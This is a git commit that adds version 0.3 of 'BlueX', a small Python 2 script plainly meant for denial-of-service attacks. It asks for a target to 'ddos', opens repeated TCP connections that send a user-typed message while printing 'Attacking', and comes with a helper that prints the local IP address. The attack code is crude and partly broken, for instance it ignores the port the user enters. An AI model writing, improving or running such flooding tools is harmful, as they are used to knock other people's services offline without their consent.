e5a0ebeeb6fe9f6e5029ba442e0a39ca6e2b1087
Tomáš Tomovčík <tomovcik.tomas@gmail.com>
2015-11-19 20:39:11 +0100

    Added version 0.3
    Added version 0.3, smaller script and faster ping :)

---
+++ Versions/0.3/linux/BlueX.py
@@ -0,0 +1,40 @@
+import time
+import socket
+import os
+import sys
+import string
+
+def restart_program():
+    python = sys.executable
+    os.execl(python, python, * sys.argv)
+curdir = os.getcwd()
+os.system('clear')
+print ("BlueX 0.3 (for Linux)")
+print ("")
+host=raw_input("Address/IP to ddos: ")
+port=input( "Port (80): " )
+conn=input("Connections: ")
+message=raw_input("Press enter to continue.")
+ip = socket.gethostbyname( host )
+print ("-----------------------------------------------------")
+print ("")
+def dos():
+    #pid = os.fork()
+    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        ddos.connect((host, 80))
+        ddos.send( message )
+        ddos.sendto( message, (ip, port) )
+        ddos.send( message );
+    except socket.error, msg:
+        print("--> Error!")
+    print ( "--> Attacking "+host +", with IP: "+ ip +"")
+    ddos.close()
+for i in range(1, conn):
+    dos()
+print ("-------------------------------------------------------")
+print ("BlueX_attack: "+host +" with IP: "+ ip +" --> FINISHED!")
+if __name__ == "__main__":
+    answer = raw_input("Continue? (Y/N)")
+    if answer.strip() in "Y y".split():
+        restart_program()
---
+++ Versions/0.3/linux/local_ip.py
@@ -0,0 +1,9 @@
+import time
+import socket
+import os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.connect(("duckduckgo.com",80))
+os.system("clear")
+print (s.getsockname()[0])
+s.close()
